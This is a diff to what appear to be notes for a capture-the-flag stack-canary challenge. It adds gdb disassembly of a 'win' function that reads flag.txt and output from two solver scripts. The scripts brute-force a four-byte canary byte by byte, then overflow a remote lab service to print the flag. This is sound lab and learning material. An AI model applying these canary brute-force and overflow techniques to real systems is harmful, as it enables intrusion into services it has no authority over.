@@ -151,6 +151,29 @@ Dump of assembler code for function read_canary:
    0x0000000000400995 <+66>:	leaveq
    0x0000000000400996 <+67>:	retq
 End of assembler dump.
+(gdb) disassemble win
+Dump of assembler code for function win:
+   0x00000000004008fd <+0>:	push   %rbp
+   0x00000000004008fe <+1>:	mov    %rsp,%rbp
+   0x0000000000400901 <+4>:	sub    $0x90,%rsp
+   0x0000000000400908 <+11>:	mov    $0x400b78,%esi
+   0x000000000040090d <+16>:	mov    $0x400b7a,%edi
+   0x0000000000400912 <+21>:	callq  0x4007f0 <fopen@plt>
+   0x0000000000400917 <+26>:	mov    %rax,-0x8(%rbp)
+   0x000000000040091b <+30>:	mov    -0x8(%rbp),%rdx
+   0x000000000040091f <+34>:	lea    -0x90(%rbp),%rax
+   0x0000000000400926 <+41>:	mov    $0x80,%esi
+   0x000000000040092b <+46>:	mov    %rax,%rdi
+   0x000000000040092e <+49>:	callq  0x4007a0 <fgets@plt>
+   0x0000000000400933 <+54>:	lea    -0x90(%rbp),%rax
+   0x000000000040093a <+61>:	mov    %rax,%rdi
+   0x000000000040093d <+64>:	callq  0x400730 <puts@plt>
+   0x0000000000400942 <+69>:	mov    0x200757(%rip),%rax        # 0x6010a0 <stdout@@GLIBC_2.2.5>
+   0x0000000000400949 <+76>:	mov    %rax,%rdi
+   0x000000000040094c <+79>:	callq  0x4007c0 <fflush@plt>
+   0x0000000000400951 <+84>:	leaveq
+   0x0000000000400952 <+85>:	retq
+End of assembler dump.
 (gdb) x/s 0x400b7a
 0x400b7a:	"flag.txt"
 (gdb) x/s 0x400b78
@@ -179,3 +202,28 @@ hacker detected!
 
 
 ============================================================================================================================================================================================================================================================
+
+❯ python 6-canary-1.py
+Byte 1/4:  41%|█████████████████████████████████████▎                                                     | 105/256 [01:49<02:37,  1.04s/it]
+found: 0x69
+Byte 2/4:  45%|█████████████████████████████████████████▏                                                 | 116/256 [02:00<02:25,  1.04s/it]
+found: 0x74
+Byte 3/4:  45%|████████████████████████████████████████▉                                                  | 115/256 [01:59<02:26,  1.04s/it]
+found: 0x73
+Byte 4/4:  35%|███████████████████████████████▉                                                            | 89/256 [01:32<02:53,  1.04s/it]
+found: 0x59
+CANARY = b'itsY'
+
+
+❯ python 6-canary-2.py
+[+] Opening connection to 10.0.118.104 on port 4456: Done
+[*] Switching to interactive mode
+
+
+You said something
+
+itsYOURcanary{helloCTF431}
+/bin/bash: line 1:  7474 Segmentation fault      (core dumped) ./vuln
+$
+[*] Interrupted
+[*] Closed connection to 10.0.118.104 port 4456
